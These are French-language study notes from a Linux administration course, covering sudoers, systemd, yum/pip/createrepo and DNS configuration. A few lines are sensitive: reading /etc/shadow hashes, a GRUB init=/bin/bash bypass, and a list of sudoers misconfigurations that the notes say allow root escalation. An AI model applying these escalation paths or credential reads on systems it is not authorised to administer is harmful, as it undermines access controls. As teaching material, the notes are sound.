# Notes - Linux Fundamentals

**Source** : KodeKloud Linux Basics Course / Udemy / Docs  
**Dates** : Janvier 2026  
**Progression** : Module X/Y complété

---

## Module 1 : Introduction au Shell Linux

### Concepts clés
- **Shell** : Interface texte pour communiquer avec l'OS (bash, zsh, sh)
- **Terminal** : Application qui héberge le shell
- **Prompt** : `user@hostname:~$` ($ = user, # = root)

### Commandes de base
```bash
# Navigation
pwd                 # Print Working Directory
ls -lah            # Liste détaillée + fichiers cachés + taille humaine
cd /path/to/dir    # Change Directory

# Manipulation fichiers
cp source dest     # Copier
mv old new         # Déplacer/Renommer
rm -rf dir/        # Supprimer récursivement (DANGER)
mkdir -p a/b/c     # Créer arborescence
```

### Points d'attention
- Toujours vérifier avec `pwd` avant `rm -rf`
- `-r` = récursif, `-f` = force (pas de confirmation)
- Chemins absolus vs relatifs : `/home/user` vs `../dir`

---

## Module 2 : Gestion des utilisateurs et permissions

### Utilisateurs
```bash
# Créer utilisateur standard
sudo useradd -m -s /bin/bash john    # Créer user avec home + shell
sudo passwd john                      # Définir mot de passe
sudo usermod -aG sudo john           # Ajouter au groupe sudo
id john                              # Infos user (UID, GID, groupes)

# Créer utilisateur TEMPORAIRE avec expiration (Challenge 5)
sudo useradd -m -e YYYY-MM-DD username
# -m : créer home directory
# -e : date expiration compte (format ISO 8601)
# Exemple : useradd -m -e 2024-02-17 mark

# Vérifier/modifier expiration
chage -l username                    # Lister infos password aging + expiration
sudo chage -E YYYY-MM-DD username    # Modifier expiration user existant
sudo chage -E -1 username            # Désactiver expiration (permanent)

# Infos utilisateur
cat /etc/passwd | grep username      # Voir ligne user (UID, home, shell)
sudo cat /etc/shadow | grep username # Voir hash password + expiration
```

**⚠️ Points attention :**
- Format date expiration : **YYYY-MM-DD** (ISO 8601) obligatoire
- Vérifier avec `useradd --help` si oubli options
- `/etc/shadow` champ 8 = jours depuis epoch Unix (19770 = 2024-02-17)
- `useradd` (low-level) vs `adduser` (wrapper Debian interactif) : préférer `useradd` en scripts

**Use case pro :**
- Contractors/stagiaires : expiration automatique fin contrat
- Comptes test/démo : nettoyage automatique
- Conformité audits : accès temporaires tracés

---

### Permissions (rwx)
```
-rwxr-xr--  1 user group  4096 Jan 02 10:30 file.txt
 │││││││││
 │││││││└┴─ Others : r-- (lecture seule)
 │││││└┴─── Group  : r-x (lecture + exécution)
 │││└┴───── Owner  : rwx (lecture + écriture + exécution)
 ││└─────── Type   : - (fichier) / d (directory) / l (link)
```

**Commandes** :
```bash
chmod 755 script.sh        # rwxr-xr-x (owner full, others read+exec)
chmod u+x file             # Ajouter exécution pour owner
chown user:group file      # Changer propriétaire
```

**Chiffres** : r=4, w=2, x=1 → 755 = (4+2+1)(4+1)(4+1)

---

### Sudo (superuser do) - Configuration avancée

**Concepts :**
- **sudo** : Exécuter commandes privilégiées en tant qu'autre user (généralement root)
- **sudoers** : Fichier config `/etc/sudoers` (éditer UNIQUEMENT avec `visudo`)
- **NOPASSWD** : Permet exécution sudo SANS demander mot de passe

### Commandes essentielles (Challenge 11)

```bash
# Éditer sudoers (SAFE - vérifie syntaxe)
sudo visudo

# Vérifier syntaxe sudoers sans éditer
sudo visudo -c

# Lister privilèges sudo user courant
sudo -l

# Lister privilèges sudo autre user
sudo -l -U <username>

# Valider timestamp sudo (rafraîchir 15min)
sudo -v

# Exécuter commande en tant qu'autre user
sudo -u <user> <command>

# Devenir root (interactive shell)
sudo -i        # Login shell (charge .profile root)
sudo -s        # Non-login shell (garde env user)
su -           # Legacy (demande password root - déconseillé)
```

### Configuration /etc/sudoers

**Structure règle sudoers :**
```
user    hosts=(runas)    commands
```

**Syntaxes courantes :**

```bash
# User sudo complet avec password
john    ALL=(ALL)    ALL

# User sudo complet SANS password (Challenge 11)
yousuf  ALL=(ALL)    NOPASSWD:ALL

# User sudo commandes spécifiques
alice   ALL=(ALL)    /bin/systemctl, /usr/bin/yum, /usr/bin/apt

# User sudo commandes spécifiques SANS password
bob     ALL=(ALL)    NOPASSWD: /usr/sbin/reboot, /usr/sbin/shutdown

# Group sudo (préfixe %)
%admin  ALL=(ALL)    ALL
%wheel  ALL=(ALL)    NOPASSWD:ALL

# User sudo avec restrictions host
dave    webserver=(ALL)    ALL

# User sudo en tant qu'autre user spécifique
tom     ALL=(nginx)    /usr/bin/nginx -t

# Désactiver sudo pour user
eve     ALL=(ALL)    !/usr/bin/passwd root
# ! = NOT (empêche commande spécifique)
```

### Alias (simplifier gestion)

```bash
# Alias commandes
Cmnd_Alias SERVICES = /bin/systemctl, /usr/bin/service
Cmnd_Alias NETWORKING = /sbin/ifconfig, /usr/bin/ip
Cmnd_Alias SOFTWARE = /usr/bin/yum, /usr/bin/apt

# Alias users
User_Alias ADMINS = john, alice, bob

# Alias hosts
Host_Alias WEBSERVERS = web1, web2, web3

# Utilisation alias
ADMINS  ALL=(ALL)    SERVICES, NETWORKING
%devs   WEBSERVERS=(ALL)    SOFTWARE
```

### Options avancées sudoers

**Fichier `/etc/sudoers` (header) :**

```bash
# Defaults specification
Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Timeout session sudo (défaut 15min)
Defaults    timestamp_timeout=5

# Désactiver timeout (demander password à chaque sudo)
Defaults    timestamp_timeout=0

# Exiger TTY (empêche sudo depuis scripts non-interactifs)
Defaults    requiretty

# Conserver variables environnement
Defaults    env_keep += "http_proxy https_proxy no_proxy"

# Logger commandes sudo
Defaults    log_output
Defaults    logfile="/var/log/sudo.log"
```

### Fichiers drop-in /etc/sudoers.d/

**Bonne pratique :** Créer fichiers séparés au lieu modifier `/etc/sudoers` directement.

```bash
# Créer fichier drop-in
sudo visudo -f /etc/sudoers.d/developers

# Contenu fichier
%developers  ALL=(ALL)  NOPASSWD: /usr/bin/systemctl restart nginx

# Permissions requises (sinon ignoré)
sudo chmod 0440 /etc/sudoers.d/developers

# Syntaxe validée par visudo automatiquement
```

**Ordre parsing :** `/etc/sudoers` → fichiers `/etc/sudoers.d/` (alphabétique)

### Use cases professionnels

**1. Administrateur junior (accès limité) :**
```bash
junior_admin  ALL=(ALL)  NOPASSWD: /usr/bin/systemctl status *, \
                                   /usr/bin/systemctl restart nginx, \
                                   /usr/bin/tail -f /var/log/*
```

**2. Scripts automation (CI/CD) :**
```bash
# User jenkins déploiement sans password
jenkins  ALL=(ALL)  NOPASSWD: /usr/bin/systemctl restart myapp, \
                              /usr/bin/docker compose up -d
```

**3. Support utilisateurs (reset passwords) :**
```bash
support  ALL=(ALL)  /usr/bin/passwd [a-z]*, !/usr/bin/passwd root
# Peut changer passwords users normaux, PAS root
```

**4. Stagiaires (accès lecture seule) :**
```bash
stagiaire  ALL=(ALL)  NOPASSWD: /usr/bin/cat /var/log/*, \
                                /usr/bin/systemctl status *, \
                                /usr/bin/docker ps
```

### Debugging sudo

**Problème : "user is not in sudoers file" :**
```bash
# Vérifier membership groupe sudo/wheel
groups <username>

# Ajouter user au groupe sudo (Debian/Ubuntu)
sudo usermod -aG sudo <username>

# Ajouter user au groupe wheel (RHEL/CentOS)
sudo usermod -aG wheel <username>

# Forcer reload groups (logout/login requis normalement)
newgrp sudo
```

**Problème : Syntaxe error sudoers (bloque tout sudo) :**
```bash
# Si locked out, booter en single-user mode
# Au boot GRUB : Appuyer 'e', ajouter 'single' ou 'init=/bin/bash'

# Vérifier syntaxe
sudo visudo -c

# Restaurer backup si cassé
sudo cp /etc/sudoers.bak /etc/sudoers
```

**Problème : Logs sudo :**
```bash
# Voir logs sudo (Debian/Ubuntu)
grep sudo /var/log/auth.log

# Voir logs sudo (RHEL/CentOS)
grep sudo /var/log/secure

# Logs journald
journalctl -t sudo

# Activer logging détaillé (dans sudoers)
Defaults log_output
Defaults logfile="/var/log/sudo.log"
```

### Sécurité sudo

**Bonnes pratiques :**
1. **Toujours utiliser `visudo`** (vérifie syntaxe avant enregistrer)
2. **Principe moindre privilège** : Donner accès commandes spécifiques, PAS `ALL`
3. **Éviter `NOPASSWD:ALL` en production** : Risque compromission compte = root immédiat
4. **Utiliser `/etc/sudoers.d/`** : Facilite gestion + rollback
5. **Auditer régulièrement** : `sudo -l -U <user>` pour vérifier permissions
6. **Logger commandes sudo** : Traçabilité actions admin

**Mauvaises pratiques (ÉVITER) :**
```bash
# DANGER : Wildcards non contrôlés
user  ALL=(ALL)  NOPASSWD: /usr/bin/*
# → Permet TOUT dans /usr/bin/ (escalade possible)

# DANGER : Édition fichiers sensibles
user  ALL=(ALL)  /usr/bin/vi /etc/sudoers
# → Peut s'auto-accorder root permanent

# DANGER : Shells
user  ALL=(ALL)  /bin/bash
# → Ouvre shell root directement (contourne restrictions)
```

### ⚠️ Pitfalls

1. **Éditer `/etc/sudoers` avec vi/nano** → Risque casser syntaxe, bloquer sudo (TOUJOURS visudo)
2. **NOPASSWD sur commandes éditeurs** (`vi`, `nano`) → User peut éditer sudoers depuis inside
3. **Wildcards trop permissifs** → Escalade privilèges
4. **Oublier logout/login** après `usermod -aG sudo` → Changements pas appliqués
5. **`sudo su -` vs `sudo -i`** : Similaires mais `-i` plus propre (charge env root)

### Comparaison : su vs sudo

| Critère | `su -` | `sudo` |
|---------|--------|--------|
| Password requis | Root password | User password (si pas NOPASSWD) |
| Audit | Non (qui a fait quoi ?) | Oui (logs détaillés) |
| Granularité | Tout ou rien | Commandes spécifiques possibles |
| Sécurité | Partager password root | Chaque user son password |
| Recommandation | ❌ Legacy (éviter) | ✅ Moderne (privilégier) |

---

## Module 3 : Gestion des processus

### Commandes
```bash
ps aux                     # Liste tous processus
ps aux | grep nginx        # Filtrer processus nginx
top / htop                 # Monitoring temps réel
kill -9 PID                # Tuer processus (SIGKILL)
killall nginx              # Tuer tous processus nommés nginx
```

### Signaux utiles
- `SIGTERM (15)` : Arrêt propre (défaut)
- `SIGKILL (9)` : Arrêt forcé (ne peut être ignoré)
- `SIGHUP (1)` : Recharger config

---

## Module 4 : Systemd (gestion services)

### Targets (Runlevels) - Challenge 14

**Concept :** Targets = groupes services (remplaçant runlevels SysVinit).

**Mapping runlevels ↔ targets :**

| Runlevel | Target systemd | Description |
|----------|----------------|-------------|
| 0 | `poweroff.target` | Arrêt système |
| 1, s | `rescue.target` | Mode rescue (single user) |
| 2, 3, 4 | `multi-user.target` | Mode texte (multi-users, réseau) |
| 5 | `graphical.target` | Mode GUI (interface graphique) |
| 6 | `reboot.target` | Redémarrage |

**Commandes essentielles :**
```bash
# Voir target par défaut
systemctl get-default
# multi-user.target

# Changer target par défaut (permanent)
sudo systemctl set-default graphical.target
sudo systemctl daemon-reload  # Requis après modif

# Changer target immédiatement (temporaire)
sudo systemctl isolate graphical.target

# Lister targets actifs
systemctl list-units --type=target

# Voir dépendances target
systemctl list-dependencies graphical.target
```

**set-default vs isolate :**
- `set-default` : Changement **permanent** (survit reboot)
- `isolate` : Changement **temporaire** (jusqu'à reboot)

**daemon-reload - Quand requis ?**
- Après modification `/etc/systemd/system/` (units, symlinks, targets)
- Après ajout nouveau service
- PAS requis pour start/stop/restart services

**Use cases :**
- Serveur production headless : `multi-user.target` (économie RAM ~500MB-1GB)
- Serveur VDI/GPU : `graphical.target` (desktop environment)
- Troubleshooting : `rescue.target` (accès minimal réparer)

**⚠️ Pitfalls :**
- Oublier `daemon-reload` → changements ignorés
- Confondre `set-default` (permanent) et `isolate` (temporaire)

---

### Services systemd - Gestion complète

**Concepts :**
- **Service** : Processus géré par systemd (daemon)
- **Unit file** : Fichier config service (`.service`)
- **Locations** : `/usr/lib/systemd/system/` (système) ou `/etc/systemd/system/` (custom/overrides)

### Commandes essentielles

**Démarrage/Arrêt services :**
```bash
# Démarrer service
sudo systemctl start <service>

# Arrêter service
sudo systemctl stop <service>

# Redémarrer service (stop + start)
sudo systemctl restart <service>

# Recharger config sans redémarrage (si supporté)
sudo systemctl reload <service>

# Redémarrer si actif, sinon démarrer
sudo systemctl try-restart <service>

# Recharger config ou redémarrer si pas possible
sudo systemctl reload-or-restart <service>
```

**Activation boot (Challenge 10) :**
```bash
# Activer service au démarrage (créer symlink)
sudo systemctl enable <service>

# Désactiver service au démarrage (supprimer symlink)
sudo systemctl disable <service>

# Activer + démarrer immédiatement (combo - RECOMMANDÉ)
sudo systemctl enable --now <service>
# Équivalent à : systemctl enable + systemctl start

# Désactiver + arrêter immédiatement
sudo systemctl disable --now <service>
```

**État et diagnostics :**
```bash
# Vérifier statut service (running/stopped/failed)
sudo systemctl status <service>
# Affiche : état, PID, uptime, logs récents (10 dernières lignes)

# Vérifier si service actif
sudo systemctl is-active <service>
# Output : active / inactive / failed

# Vérifier si service activé boot
sudo systemctl is-enabled <service>
# Output : enabled / disabled / static / masked

# Vérifier si service a échoué
sudo systemctl is-failed <service>
# Output : active / failed

# Lister tous services
systemctl list-units --type=service

# Lister services échoués
systemctl list-units --type=service --state=failed

# Lister tous services (actifs + inactifs)
systemctl list-units --type=service --all

# Afficher fichier unit service
systemctl cat <service>

# Afficher dépendances service
systemctl list-dependencies <service>
```

**Masking (bloquer service) :**
```bash
# Masquer service (empêcher démarrage manuel/auto)
sudo systemctl mask <service>

# Démasquer service
sudo systemctl unmask <service>
```

### Logs services (journalctl)

```bash
# Voir logs service spécifique
journalctl -u <service>

# Logs depuis aujourd'hui
journalctl -u <service> --since today

# Logs dernière heure
journalctl -u <service> --since "1 hour ago"

# Logs entre deux dates
journalctl -u <service> --since "2026-01-10 09:00" --until "2026-01-10 12:00"

# Suivre logs temps réel (tail -f)
journalctl -u <service> -f

# Afficher N dernières lignes
journalctl -u <service> -n 50

# Logs avec priorité ERROR ou plus grave
journalctl -u <service> -p err

# Logs format verbose (détails complets)
journalctl -u <service> -o verbose

# Vider journald (libérer espace)
sudo journalctl --vacuum-time=2d    # Garder 2 jours
sudo journalctl --vacuum-size=100M  # Garder 100MB max
```

### Structure fichier unit (.service)

**Emplacement** : `/etc/systemd/system/myservice.service`

```ini
[Unit]
Description=My Custom Service
After=network.target

[Service]
Type=simple
User=myuser
WorkingDirectory=/opt/myapp
ExecStart=/usr/bin/python3 /opt/myapp/server.py
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
```

**Sections principales :**
- `[Unit]` : Métadonnées (description, dépendances)
- `[Service]` : Configuration exécution (commande, user, restart policy)
- `[Install]` : Comportement installation (target)

**Types services** :
- `simple` : Processus reste foreground (défaut)
- `forking` : Processus fork puis parent exit
- `oneshot` : Processus s'exécute puis termine (scripts)
- `notify` : Service notifie systemd quand prêt

**Restart policies** :
- `no` : Pas de redémarrage auto
- `on-failure` : Redémarrer si échec
- `on-abnormal` : Redémarrer si signal/timeout
- `always` : Toujours redémarrer

### Use cases

**Serveurs applicatifs (Challenge 10 - squid) :**
```bash
# Installation + activation service
sudo yum install squid -y
sudo systemctl enable --now squid
# Service actif + démarre au boot
```

**Services custom (application Python/Node) :**
```bash
# Créer unit file
sudo vi /etc/systemd/system/myapp.service
# (Contenu ci-dessus)

# Recharger systemd
sudo systemctl daemon-reload

# Démarrer + activer
sudo systemctl enable --now myapp
```

**Troubleshooting service qui ne démarre pas :**
```bash
# 1. Vérifier statut détaillé
sudo systemctl status <service>

# 2. Voir logs service
journalctl -u <service> -n 100

# 3. Vérifier fichier unit
systemctl cat <service>

# 4. Tester commande ExecStart manuellement
sudo /path/to/command (copié depuis unit file)

# 5. Vérifier permissions (user/group correct)
ls -l /path/to/binary
```

### Comparaison : enable vs enable --now

| Commande | Service démarré ? | Actif au boot ? |
|----------|------------------|-----------------|
| `systemctl start` | ✅ Oui (immédiat) | ❌ Non |
| `systemctl enable` | ❌ Non | ✅ Oui (prochain boot) |
| `systemctl enable --now` | ✅ Oui (immédiat) | ✅ Oui (prochain boot) |

**Recommandation :** Toujours utiliser `enable --now` pour combiner les deux actions.

### ⚠️ Pitfalls

1. **Oublier `daemon-reload`** après modification unit file → changements ignorés
2. **Confondre `restart` et `reload`** :
   - `restart` : Coupe connexions actives (downtime)
   - `reload` : Recharge config sans couper (si supporté par service)
3. **Service masked** : Impossible de démarrer tant que masqué (unmask d'abord)
4. **Dépendances** : Service peut échouer si dépendance (After=) non disponible
5. **Type=simple vs forking** : Mauvais type → systemd pense service failed alors qu'actif

### Debugging avancé

```bash
# Voir chaîne complète dépendances
systemd-analyze verify /etc/systemd/system/myservice.service

# Analyser boot (temps démarrage services)
systemd-analyze blame

# Graphe dépendances boot
systemd-analyze plot > boot.svg
```

---

## Module 5 : Gestion des paquets

### Debian/Ubuntu (apt)
```bash
sudo apt update                  # Mettre à jour liste paquets
sudo apt upgrade                 # Mettre à jour paquets installés
sudo apt install nginx           # Installer paquet
sudo apt remove nginx            # Désinstaller (garde config)
sudo apt purge nginx             # Désinstaller + supprimer config
apt search keyword               # Chercher paquet
```

### RedHat/CentOS (yum/dnf) - Challenge 07

**yum** : Package manager RHEL/CentOS (remplacé par `dnf` sur RHEL 8+, mais commandes identiques).

**Commandes essentielles** :
```bash
# Mettre à jour cache repos
sudo yum makecache

# Installer package
sudo yum install git                    # Interactif (prompt confirmation)
sudo yum install git -y                 # Non-interactif (assume yes)

# Rechercher package
yum search keyword                      # Chercher dans repos
yum info package                        # Détails package (version, size, repo)

# Lister packages installés
yum list installed                      # Tous packages installés
yum list installed | grep git           # Filtrer

# Mettre à jour packages
sudo yum update                         # Tous packages
sudo yum update git                     # Package spécifique

# Désinstaller package
sudo yum remove git                     # Désinstaller

# Nettoyer cache
sudo yum clean all                      # Supprimer cache téléchargé
```

**Options utiles** :
- `-y` : Assume "yes" (automation scripts, CI/CD)
- `--assumeno` : Assume "no" (dry-run)
- `--downloadonly` : Télécharger sans installer
- `--enablerepo=repo_name` : Activer repo désactivé temporairement
- `--disablerepo=repo_name` : Désactiver repo temporairement

**Gestion repositories** :
```bash
# Lister repos activés
yum repolist

# Lister repos disponibles (activés + désactivés)
yum repolist all

# Activer repo désactivé
sudo yum-config-manager --enable repo_name

# Désactiver repo
sudo yum-config-manager --disable repo_name
```

**Use cases professionnels** :
- **Automation** : Playbooks Ansible (`yum: name=git state=present`)
- **Sécurité** : Updates réguliers (`yum update -y` cron jobs)
- **Standardisation** : Déploiement packages identiques multi-serveurs

**⚠️ Pitfalls** :
- Oublier `-y` scripts → hang waiting input
- `yum update` sans sauvegarde → regression potentielle
- Conflits dependencies → résoudre avec `yum remove conflicting_package`

---

### pip (Python Package Index) - Challenge 08

**pip** : Gestionnaire packages Python (PyPI).

**Installation packages** :
```bash
# pip vs pip3
pip install package                     # Python 2 (obsolète)
pip3 install package                    # Python 3 (recommandé)
python3 -m pip install package          # Méthode recommandée (garantit bon pip)

# Version spécifique
pip3 install ansible==4.9.0             # Exactement 4.9.0
pip3 install "ansible>=4.0,<5.0"        # Range version

# Installation globale (système)
sudo pip3 install ansible               # Tous utilisateurs
sudo python3 -m pip install ansible     # Méthode recommandée

# Installation utilisateur (sans sudo)
pip3 install --user ansible             # ~/.local/bin/
```

**Vérifier packages installés** :
```bash
pip3 list                               # Tous packages
pip3 list | grep ansible                # Filtrer
pip3 show ansible                       # Détails package (version, location)
```

**Mettre à jour packages** :
```bash
pip3 install --upgrade ansible          # Dernière version
pip3 install --upgrade pip              # Mettre à jour pip lui-même
```

**Désinstaller** :
```bash
pip3 uninstall ansible                  # Supprimer package
pip3 uninstall -y ansible               # Sans confirmation
```

**Requirements files** :
```bash
# Créer fichier requirements
pip3 freeze > requirements.txt

# Installer depuis requirements
pip3 install -r requirements.txt
```

**Environnements virtuels (best practice)** :
```bash
# Créer venv
python3 -m venv myenv

# Activer
source myenv/bin/activate               # Linux/macOS
myenv\Scripts\activate.bat              # Windows

# Installer packages (isolation)
pip install ansible                     # Dans venv uniquement

# Désactiver
deactivate
```

**Installation globale binaires (Challenge 08)** :

**Problème** : Par défaut pip installe dans `/usr/local/bin/` mais peut ne pas être dans PATH.

**Solution** :
```bash
# Installer package
sudo python3 -m pip install ansible

# Vérifier location binaire
which ansible
# /usr/local/bin/ansible

# Si absent PATH, ajouter à ~/.bash_profile ou ~/.bashrc
export PATH=$PATH:/usr/local/bin

# Recharger profil
source ~/.bash_profile
```

**argcomplete (autocomplétion)** :
```bash
# Installer argcomplete
sudo pip3 install argcomplete

# Activer globalement (tous utilisateurs)
sudo activate-global-python-argcomplete

# Activer user spécifique (~/.bashrc)
eval "$(register-python-argcomplete ansible)"

# Recharger shell
source ~/.bash_profile
```

**Use cases professionnels** :
- **DevOps tools** : ansible, awscli, docker-compose
- **Développement** : pytest, black, flake8, mypy
- **Data Science** : pandas, numpy, matplotlib

**⚠️ Pitfalls** :
- `sudo pip` vs `pip --user` : Préférer venv (éviter polluer système)
- Conflits versions : venv isolation recommandée
- `pip` vs `pip3` : Toujours utiliser `pip3` (Python 3)
- Oublier `source venv/bin/activate` → installe globalement

---

### createrepo - Repositories yum locaux (Challenge 09)

**createrepo** : Outil génération metadata pour repositories yum locaux.

**Workflow création repo local** :

**1. Créer répertoire packages** :
```bash
sudo mkdir -p /packages/downloaded_rpms
```

**2. Copier packages RPM** :
```bash
sudo cp *.rpm /packages/downloaded_rpms/
```

**3. Générer metadata repository** :
```bash
sudo createrepo /packages/downloaded_rpms/
```

**Sortie** :
```
Spawning worker 0 with 15 pkgs
Workers Finished
Saving Primary metadata
Saving file lists metadata
Saving other metadata
Generating sqlite DBs
Sqlite DBs complete
```

**Résultat** : Crée `/packages/downloaded_rpms/repodata/` avec :
- `repomd.xml` : Index metadata
- `primary.xml.gz` : Liste packages
- `filelists.xml.gz` : Liste fichiers
- `other.xml.gz` : Changelog
- Bases SQLite

**4. Configurer repository yum** :

Créer fichier `/etc/yum.repos.d/epel_local.repo` :
```ini
[epel_local]
name=Local EPEL Repository
baseurl=file:///packages/downloaded_rpms/
gpgcheck=0
enabled=1
```

**Explication champs** :
- `[epel_local]` : **Repository ID** (bracket, unique)
- `name=` : Nom descriptif (affiché dans messages yum)
- `baseurl=` : URL repository
  * `file:///` : Protocole local (3 slashes)
  * `http://` : Repo web
  * `ftp://` : Repo FTP
- `gpgcheck=0` : Désactiver vérification signature GPG (repos locaux trustés)
  * `gpgcheck=1` : Activer (requis `gpgkey=/path/to/key.asc`)
- `enabled=1` : Activer repo (0 = désactivé)

**Autres champs utiles** :
```ini
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-8
priority=1                              # Priorité repo (1 = haute)
exclude=kernel*                         # Exclure packages
includepkgs=nginx* php*                 # Inclure uniquement
cost=500                                # Coût repo (préférence, défaut 1000)
```

**5. Reconstruire cache yum** :
```bash
sudo yum makecache
```

**6. Vérifier repo activé** :
```bash
yum repolist
```

**Sortie attendue** :
```
repo id           repo name                               status
epel_local        Local EPEL Repository                   15
```

**7. Installer package depuis repo local** :
```bash
sudo yum install wget --enablerepo=epel_local
```

**Vérifier provenance** :
```bash
yum info wget
```

**Sortie** :
```
Name        : wget
Version     : 1.x.x
...
Repository  : epel_local
```

**Mettre à jour repository (ajout packages)** :
```bash
# Copier nouveaux RPM
sudo cp new_package.rpm /packages/downloaded_rpms/

# Régénérer metadata
sudo createrepo --update /packages/downloaded_rpms/

# Reconstruire cache yum
sudo yum clean all
sudo yum makecache
```

**Use cases professionnels** :
- **Air-gapped servers** : Serveurs sans Internet (haute sécurité, militaire)
- **Standardisation** : Versions packages contrôlées (éviter regressions)
- **Compliance** : Audit packages utilisés (traçabilité RGPD)
- **Performance** : Éviter téléchargements répétés (bande passante limitée)
- **Custom packages** : Distribuer RPM internes (applications propriétaires)

**Debugging repos** :
```bash
# Vérifier metadata généré
ls -lh /packages/downloaded_rpms/repodata/

# Tester repo manuellement
yum --disablerepo=* --enablerepo=epel_local list available

# Verbose mode
yum -v install wget

# Logs yum
tail -f /var/log/yum.log
```

**⚠️ Pitfalls** :
- Oublier `createrepo` → yum ne reconnaît pas répertoire
- `file://` vs `file:///` : 3 slashes requis (protocole + absolute path)
- gpgcheck=1 sans gpgkey → erreur signature manquante
- Oublier `--update` après ajout packages → metadata obsolète
- Permissions répertoire : doit être lisible par tous (`chmod 755`)

---

## Module 6 : Réseau

### Commandes diagnostic
```bash
ip addr show                     # Afficher interfaces réseau (remplace ifconfig)
ip route show                    # Table de routage
ping -c 4 8.8.8.8               # Test connectivité (4 paquets)
traceroute google.com            # Trace route réseau
netstat -tuln                    # Ports en écoute (t=TCP, u=UDP, l=listening, n=numérique)
ss -tuln                         # Remplaçant moderne de netstat
curl ifconfig.me                 # IP publique
```

### Configuration IP
```bash
sudo ip addr add 192.168.1.100/24 dev eth0
sudo ip link set eth0 up
```

---

### DNS Résolution - Configuration complète (Challenge 12)

**Concepts :**
- **DNS (Domain Name System)** : Résolution noms domaines → adresses IP
- **Nameserver** : Serveur DNS qui répond aux requêtes
- `/etc/resolv.conf` : Fichier config résolution DNS (client)
- `/etc/hosts` : Résolution statique locale (prioritaire)

### Configuration /etc/resolv.conf

**Structure fichier :**
```bash
# DNS serveur primaire
nameserver 10.0.0.1

# DNS serveur secondaire (fallback)
nameserver 8.8.8.8

# DNS serveur tertiaire
nameserver 8.8.4.4

# Domaines recherche (complète hostnames partiels)
search stratos.xfusioncorp.com example.local

# Options résolution
options timeout:2 attempts:3 rotate
```

**Directives principales :**
- `nameserver IP` : Serveur DNS à interroger (max 3 utilisés par système)
- `search domain` : Suffixes domaines ajoutés automatiquement
- `options` : Paramètres résolution (timeout, attempts, rotate)

### DNS publics connus

```bash
# Google Public DNS (Challenge 12)
nameserver 8.8.8.8
nameserver 8.8.4.4

# Cloudflare DNS (rapide, privacy-focused)
nameserver 1.1.1.1
nameserver 1.0.0.1

# OpenDNS (filtrage parental possible)
nameserver 208.67.222.222
nameserver 208.67.220.220

# Quad9 (sécurité malware/phishing)
nameserver 9.9.9.9
nameserver 149.112.112.112

# DNS FAI Orange (France)
nameserver 80.10.246.2
nameserver 80.10.246.129
```

### Ordre résolution DNS

**Fichier `/etc/nsswitch.conf` :**
```bash
hosts: files dns
# Ordre : files (=/etc/hosts) PUIS dns (=/etc/resolv.conf)
```

**Workflow résolution :**
1. Chercher dans `/etc/hosts` (résolution statique)
2. Si pas trouvé → interroger nameservers `/etc/resolv.conf` (ordre déclaration)
3. Si nameserver 1 timeout → essayer nameserver 2
4. Après 3 nameservers essayés → erreur résolution

### Commandes diagnostic DNS

```bash
# Tester résolution domaine
nslookup google.com
# Affiche IP + serveur DNS utilisé

# Requête DNS détaillée
dig google.com
# Output : ANSWER SECTION, QUERY TIME, SERVER used

# Requête DNS inverse (IP → nom)
dig -x 8.8.8.8

# Test résolution avec serveur DNS spécifique
nslookup google.com 8.8.8.8
dig @8.8.8.8 google.com

# Test simple (legacy)
host google.com

# Vérifier contenu resolv.conf
cat /etc/resolv.conf

# Tester connectivité DNS serveur
ping 8.8.8.8
nc -zv 8.8.8.8 53    # Port 53 DNS
```

### systemd-resolved (distributions modernes)

**Concept :** Daemon systemd gérant résolution DNS (remplace `/etc/resolv.conf` classique).

**Fichier config :** `/etc/systemd/resolved.conf`

```bash
[Resolve]
DNS=8.8.8.8 8.8.4.4
FallbackDNS=1.1.1.1 1.0.0.1
Domains=example.com
DNSSEC=allow-downgrade
```

**Commandes systemd-resolved :**
```bash
# Vérifier statut résolution DNS
resolvectl status

# Voir serveurs DNS utilisés
resolvectl dns

# Voir domaines recherche
resolvectl domain

# Flush cache DNS
sudo resolvectl flush-caches

# Statistiques cache DNS
resolvectl statistics

# Requête DNS via systemd-resolved
resolvectl query google.com
```

**Fichier `/etc/resolv.conf` :** Sur distributions avec systemd-resolved, souvent symlink vers `/run/systemd/resolve/stub-resolv.conf`.

### Use cases (Challenge 12)

**1. Troubleshooting DNS intermittent (Challenge 12) :**
```bash
# Ajouter Google DNS comme fallback
sudo vi /etc/resolv.conf

# Ajouter après DNS locaux existants
nameserver 8.8.8.8
nameserver 8.8.4.4

# Tester résolution
ping google.fr
nslookup google.com
```

**2. Split-horizon DNS (réseau entreprise) :**
```bash
# DNS interne pour domaine local
nameserver 10.0.0.1
search corp.internal

# DNS public pour internet
nameserver 8.8.8.8
```

**3. DNS rapide (performance) :**
```bash
# Cloudflare (très faible latence)
nameserver 1.1.1.1
nameserver 1.0.0.1
```

**4. DNS sécurisé (filtrage malware) :**
```bash
# Quad9 (bloque domaines malveillants)
nameserver 9.9.9.9
nameserver 149.112.112.112
```

### Persistance /etc/resolv.conf

**Problème :** Fichier souvent écrasé par NetworkManager/DHCP.

**Solutions :**

**1. Immutable flag (force persistance) :**
```bash
sudo chattr +i /etc/resolv.conf
# Fichier non modifiable (même par root)

# Retirer immutable
sudo chattr -i /etc/resolv.conf
```

**2. NetworkManager config :**
```bash
sudo vi /etc/NetworkManager/NetworkManager.conf

[main]
dns=none

sudo systemctl restart NetworkManager
```

**3. DHCP client config :**
```bash
sudo vi /etc/dhcp/dhclient.conf

# Prepend DNS custom (prioritaires)
prepend domain-name-servers 8.8.8.8, 8.8.4.4;

# Ou remplacer complètement
supersede domain-name-servers 8.8.8.8, 8.8.4.4;
```

**4. systemd-resolved (méthode moderne) :**
```bash
sudo vi /etc/systemd/resolved.conf

[Resolve]
DNS=8.8.8.8 8.8.4.4

sudo systemctl restart systemd-resolved
```

### Debugging résolution DNS

**Problème : "temporary failure in name resolution"**
```bash
# 1. Vérifier contenu resolv.conf
cat /etc/resolv.conf
# Doit contenir au moins 1 nameserver

# 2. Tester connectivité nameserver
ping 8.8.8.8

# 3. Tester port DNS (53)
nc -zv 8.8.8.8 53

# 4. Tester résolution directe
nslookup google.com 8.8.8.8

# 5. Vérifier ordre nsswitch
cat /etc/nsswitch.conf | grep hosts

# 6. Flush cache DNS
sudo systemd-resolve --flush-caches
# ou
sudo resolvectl flush-caches
